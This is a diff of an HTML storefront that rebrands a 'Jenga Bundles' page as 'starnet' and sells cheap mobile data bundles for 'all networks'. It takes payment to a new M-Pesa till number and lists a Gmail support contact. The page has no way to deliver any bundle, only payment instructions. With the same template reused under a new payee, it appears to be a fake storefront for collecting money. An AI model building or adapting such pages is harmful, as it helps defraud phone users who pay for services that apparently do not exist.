@@ -1,251 +1,257 @@
-<!doctypetype html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Jenga Bundles</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>starnet</title>
   <style>
-    body {
-      font-family: "Segoe UI", Tahoma, sans-serif;
-      background: linear-gradient(135deg, #e6f7ff, #f4f9f9);
-      margin: 0;
-      padding: 0;
-      color: #333;
+    :root{
+      --g-dark: #27ae60;   /* emerald */
+      --g-mid:  #2ecc71;   /* bright green */
+      --g-soft: #a3e635;   /* lime accent */
+      --g-bg:   #e8f9f0;   /* pale greenish background */
+      --white:  #ffffff;
+      --muted:  #555;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      font-family: "Segoe UI", Roboto, Arial, sans-serif;
+      background: linear-gradient(180deg, #1b5e20 0%, #2ecc71 45%, #27ae60 100%);
+      color:#1b1b1b;
     }
 
-    header {
-      background: linear-gradient(90deg, #008000, #00b894);
-      color: white;
-      text-align: center;
-      padding: 1.5rem;
-      font-size: 1.8rem;
-      font-weight: bold;
-      box-shadow: 0 3px 8px rgba(0,0,0,0.2);
+    header{
+      text-align:center;
+      padding:22px 12px;
+      color:var(--white);
+      background: linear-gradient(90deg, var(--g-dark), var(--g-mid));
+      font-size:20px;
+      font-weight:700;
+      letter-spacing:0.6px;
+      box-shadow:0 4px 14px rgba(0,0,0,0.25);
     }
 
-    .container {
-      max-width: 650px;
-      margin: 2rem auto;
-      padding: 1rem;
-    }
+    .wrap{ max-width:760px; margin:18px auto; padding:18px; }
 
+    .lead-card{
+      background:var(--white);
+      border-radius:12px;
+      padding:18px;
+      text-align:center;
+      margin-bottom:18px;
+      box-shadow:0 6px 18px rgba(0,0,0,0.12);
+    }
+    .lead-card h1{ margin:0; color:var(--g-dark); font-size:22px }
+    .lead-card p{ margin:10px 0 0; color:var(--muted); font-style:italic }
+
+    /* bundle containers */
     .bundle {
-      background: white;
-      padding: 1.5rem;
-      margin-bottom: 1.2rem;
-      border-radius: 14px;
-      box-shadow: 0 6px 10px rgba(0,0,0,0.1);
-      text-align: center;
-      transition: transform 0.2s ease;
+      background: var(--white);
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      padding:18px 20px;
+      margin:14px 0;
+      color:var(--g-dark);
+      cursor:pointer;
+      transition: transform .16s ease, box-shadow .16s ease;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.08);
+    }
+    .bundle:hover{ transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,0.14); }
+
+    /* different shapes */
+    .b1{ border-radius:14px; border-left:8px solid var(--g-mid); }
+    .b2{ border-radius:40px; font-size:1.1em; border-left:10px solid var(--g-soft); }
+    .b3{ border-radius:4px; font-weight:700; border-left:6px solid var(--g-dark); }
+    .b4{ border-radius:20px 0 20px 0; border-left:8px solid #1e8449; }
+    .b5{ border-radius:30px; font-size:1.2em; border-left:10px solid #145a32; }
+    .b6{ border-radius:16px; border-left:7px solid var(--g-mid); }
+
+    .bundle .title{ font-weight:700; color:var(--g-dark) }
+    .bundle .sub{ font-size:13px; color:var(--muted) }
+    .bundle .price{ font-weight:800; color:#145a32 }
+
+    .buy-btn{
+      background: linear-gradient(90deg, var(--g-mid), var(--g-dark));
+      color: var(--white);
+      border:0;
+      padding:8px 12px;
+      border-radius:8px;
+      cursor:pointer;
+      font-weight:700;
     }
 
-    .bundle:hover {
-      transform: scale(1.02);
+    /* Support email */
+    .support{
+      margin-top:20px;
+      background:var(--white);
+      padding:14px;
+      border-radius:12px;
+      box-shadow:0 6px 18px rgba(0,0,0,0.12);
+      text-align:center;
     }
-
-    .bundle h3 {
-      margin: 0.5rem 0;
-      color: #00796b;
+    .email-toggle{
+      background:transparent;
+      border:1px solid #ccc;
+      padding:10px 16px;
+      border-radius:8px;
+      cursor:pointer;
+      font-weight:700;
     }
-
-    .bundle p {
-      margin: 0.3rem 0;
+    .email-reveal{
+      max-height:0;
+      overflow:hidden;
+      opacity:0;
+      transition:max-height .4s ease, opacity .3s ease;
+      margin-top:12px;
     }
-
-    .btn {
-      display: inline-block;
-      margin-top: 0.8rem;
-      padding: 0.7rem 1.5rem;
-      background: linear-gradient(90deg, #00c853, #64dd17);
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: bold;
-      font-size: 1rem;
-      transition: 0.3s ease;
+    .email-reveal.show{ max-height:260px; opacity:1; }
+    .email-card{
+      background:var(--g-bg);
+      border-radius:10px;
+      padding:14px;
+      box-shadow:0 6px 12px rgba(0,0,0,0.08);
     }
-
-    .btn:hover {
-      background: linear-gradient(90deg, #009624, #558b2f);
-    }
+    .email-card a{ color:var(--g-dark); font-weight:800; text-decoration:none }
 
     /* Popup */
-    .popup {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.6);
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
+    .popup{
+      display:none;
+      position:fixed;
+      inset:0;
+      background:rgba(0,0,0,0.55);
+      align-items:center;
+      justify-content:center;
+      padding:18px;
+    }
+    .popup.show{ display:flex; }
+    
+     .modal{
+      background:var(--white);
+      border-radius:12px;
+      padding:18px;
+      max-width:500px;
+      width:95%;   /* now almost full width */
+      height:95vh; /* now fills most of screen height */
+      overflow-y:auto;
+      animation:pop .25s ease;
+    }{ from{opacity:0;transform:scale(.9)} to{opacity:1;transform:scale(1)} }
+
+    .modal h3{ margin:0 0 10px; color:var(--g-dark) }
+    .till-box{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      background:var(--g-bg);
+      border-left:6px solid var(--g-mid);
+      padding:12px;
+      border-radius:10px;
+    }
+    .till-num{ font-weight:800; color:#145a32; }
+    .till-copy{ background:var(--g-mid); color:white; border:0; padding:8px 12px; border-radius:6px; cursor:pointer; }
+
+    /* Updated instructions style */
+    .steps {
+      font-size: 16px;
+      font-family: "Segoe UI", Roboto, Arial, sans-serif;
+      font-weight: 500;
+      color: #1b1b1b;
+      margin-top: 16px;
+      padding-left: 0;
+      width: 100%;
+      line-height: 1.6;
+      text-align: left;
+    }
+    .steps li {
+      margin: 12px 0;
+      list-style-position: inside;
     }
 
-    .popup-content {
-      background: white;
-      padding: 2rem;
-      border-radius: 14px;
-      max-width: 420px;
-      text-align: center;
-      box-shadow: 0 6px 15px rgba(0,0,0,0.3);
-      animation: fadeIn 0.3s ease;
-    }
-
-    @keyframes fadeIn {
-      from { transform: scale(0.8); opacity: 0; }
-      to { transform: scale(1); opacity: 1; }
-    }
-
-    .popup-content h2 {
-      margin-top: 0;
-      color: #006400;
-    }
-
-    .highlight-copy {
-      margin: 1rem 0 1.5rem;
-      text-align: center;
-      padding: 1rem;
-      background: linear-gradient(135deg, #e8f5e9, #f1f8e9);
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-    }
-
-    .copy-label {
-      margin: 0.3rem 0;
-      font-size: 1rem;
-      font-weight: 600;
-      color: #004d40;
-    }
-
-    .big-copy {
-      display: inline-block;
-      font-size: 1.4rem;
-      font-weight: bold;
-      padding: 0.4rem 1rem;
-      margin: 0.3rem 0 0.8rem;
-      background: white;
-      border: 2px solid #4caf50;
-      border-radius: 10px;
-      cursor: pointer;
-      transition: all 0.2s ease;
-    }
-
-    .big-copy:hover {
-      background: #d9fdd3;
-      transform: scale(1.05);
-    }
-
-    .close-btn {
-      margin-top: 1.2rem;
-      background: linear-gradient(90deg, #ff5252, #e53935);
-    }
-
-    .close-btn:hover {
-      background: linear-gradient(90deg, #c62828, #b71c1c);
-    }
+    .close{ margin-top:12px; width:100%; padding:10px; border:0; background:#d32f2f; color:white; border-radius:8px; font-weight:700; cursor:pointer }
   </style>
 </head>
 <body>
+  <header>starnet bundles</header>
 
-  <header>
-    Jenga Bundles
-  </header>
-
-  <div class="container">
-    <!-- Original Bundles -->
-    <div class="bundle">
-      <h3>24 Hours - 7GB</h3>
-      <p>High-speed internet<br>Works on all networks</p>
-      <p><strong>Ksh 75</strong></p>
-      <button class="btn" onclick="openPopup('24 Hours - 7GB', '75')">Buy</button>
+  <div class="wrap">
+    <div class="lead-card">
+      <h1>STARNET KENYA</h1>
+      <p>Affordable Internet Packages<br>(Available on all networks)</p>
     </div>
 
-    <div class="bundle">
-      <h3>7 Days - 12GB</h3>
-      <p>High-speed internet<br>Works on all networks</p>
-      <p><strong>Ksh 85</strong></p>
-      <button class="btn" onclick="openPopup('7 Days - 12GB', '85')">Buy</button>
+    <div class="bundle b1" onclick="openPopup('1 Day - 5GB','55')">
+      <div><div class="title">1 Day - 5GB</div><div class="sub">All networks</div></div>
+      <div><div class="price">Ksh 55</div><button class="buy-btn">Buy</button></div>
     </div>
 
-    <div class="bundle">
-      <h3>14 Days - 22GB</h3>
-      <p>High-speed internet<br>Works on all networks</p>
-      <p><strong>Ksh 115</strong></p>
-      <button class="btn" onclick="openPopup('14 Days - 22GB', '115')">Buy</button>
+    <div class="bundle b2" onclick="openPopup('3 Days - 7GB','79')">
+      <div><div class="title">3 Days - 7GB</div><div class="sub">All networks</div></div>
+      <div><div class="price">Ksh 79</div><button class="buy-btn">Buy</button></div>
     </div>
 
-    
-    <div class="bundle">
-      <h3>21 Days - 35GB</h3>
-      <p>High-speed internet<br>Works on all networks</p>
-      <p><strong>Ksh 125</strong></p>
-      <button class="btn" onclick="openPopup('21 Days - 35GB', '125')">Buy</button>
+    <div class="bundle b3" onclick="openPopup('7 Days - 9GB','99')">
+      <div><div class="title">7 Days - 9GB</div><div class="sub">All networks</div></div>
+      <div><div class="price">Ksh 99</div><button class="buy-btn">Buy</button></div>
     </div>
 
-    <div class="bundle">
-      <h3>30 Days - 50GB</h3>
-      <p>High-speed internet<br>Works on all networks</p>
-      <p><strong>Ksh 155</strong></p>
-      <button class="btn" onclick="openPopup('30 Days - 50GB', '155')">Buy</button>
+    <div class="bundle b4" onclick="openPopup('14 Days - 15GB','155')">
+      <div><div class="title">14 Days - 15GB</div><div class="sub">All networks</div></div>
+      <div><div class="price">Ksh 155</div><button class="buy-btn">Buy</button></div>
     </div>
 
-    <div class="bundle">
-      <h3>60 Days - Unlimited</h3>
-      <p>High-speed internet<br>Works on all networks</p>
-      <p><strong>Ksh 225</strong></p>
-      <button class="btn" onclick="openPopup('60 Days - Unlimited', '225')">Buy</button>
+    <div class="bundle b5" onclick="openPopup('30 Days - 25GB','225')">
+      <div><div class="title">30 Days - 25GB</div><div class="sub">All networks</div></div>
+      <div><div class="price">Ksh 225</div><button class="buy-btn">Buy</button></div>
+    </div>
+
+    <div class="bundle b6" onclick="openPopup('30 Days - Unlimited','269')">
+      <div><div class="title">30 Days - Unlimited</div><div class="sub">All networks</div></div>
+      <div><div class="price">Ksh 269</div><button class="buy-btn">Buy</button></div>
+    </div>
+
+    <div class="support">
+      <button class="email-toggle" onclick="toggleEmail()">📧 Email Support</button>
+      <div id="emailBox" class="email-reveal">
+        <div class="email-card">
+          <p>Contact: <a href="mailto:starnetkenya46@gmail.com">starnetkenya46@gmail.com</a></p>
+        </div>
+      </div>
     </div>
   </div>
 
   <!-- Popup -->
-  <div class="popup" id="popup" onclick="closeOutside(event)">
-    <div class="popup-content">
-      <h2>M-Pesa Payment Instructions</h2>
-
-      <div class="highlight-copy">
-        <p class="copy-label">Till Number:</p>
-        <span class="copyable big-copy" onclick="copyText('8471601')">8471601</span>
+  <div id="popup" class="popup" onclick="if(event.target===this)closePopup()">
+    <div class="modal">
+      <h3>M-Pesa Payment</h3>
+      <div class="till-box">
+        <div>Till Number <div class="till-num" id="tillNum">6410336</div></div>
+        <button class="till-copy" onclick="copyTill()">Copy</button>
       </div>
-
-      <p id="selected-plan"></p>
-      <hr>
-      <p><strong>Steps to Complete Your Payment:</strong></p>
-      <p>1. Go to M-Pesa on your phone</p>
-      <p>2. Select <b>Lipa na M-Pesa</b></p>
-      <p>3. Select <b>Buy Goods and Services</b></p>
-      <p>4. Enter the Till Number above</p>
-      <p>5. Enter the Amount: <span id="amount">Ksh 0</span></p>
-      <p>6. Enter your M-Pesa PIN</p>
-      <p>7. Confirm and send payment</p>
-      <p>Your package will be activated automatically after confirmation.</p>
-      <button class="btn close-btn" onclick="closePopup()">I Understand</button>
+      <p id="chosenPlan"></p>
+      <ol class="steps">
+        <li>Go to M-Pesa</li><li>Select Lipa na M-Pesa</li><li>Buy Goods and Services</li>
+        <li>Enter Till Number: 6410336</li><li>Enter Amount</li><li>Confirm Payment</li>
+      </ol>
+      <button class="close" onclick="closePopup()">Done</button>
     </div>
   </div>
 
   <script>
-    function openPopup(plan, price) {
-      document.getElementById("selected-plan").innerText = "You selected: " + plan + " (Ksh " + price + ")";
-      document.getElementById("amount").innerText = "Ksh " + price;
-      document.getElementById("popup").style.display = "flex";
+    function toggleEmail(){
+      const box = document.getElementById("emailBox");
+      box.classList.toggle("show");
     }
-
-    function closePopup() {
-      document.getElementById("popup").style.display = "none";
+    function openPopup(plan, price){
+      document.getElementById("chosenPlan").textContent = `Selected: ${plan} — Ksh ${price}`;
+      document.getElementById("popup").classList.add("show");
     }
-
-    function closeOutside(event) {
-      if (event.target.id === "popup") {
-        closePopup();
-      }
+    function closePopup(){
+      document.getElementById("popup").classList.remove("show");
     }
-
-    function copyText(text) {
-      navigator.clipboard.writeText(text).then(() => {
-        alert("Copied: " + text);
-      });
+    function copyTill(){
+      navigator.clipboard.writeText(document.getElementById("tillNum").textContent);
     }
   </script>
-
 </body>
 </html>
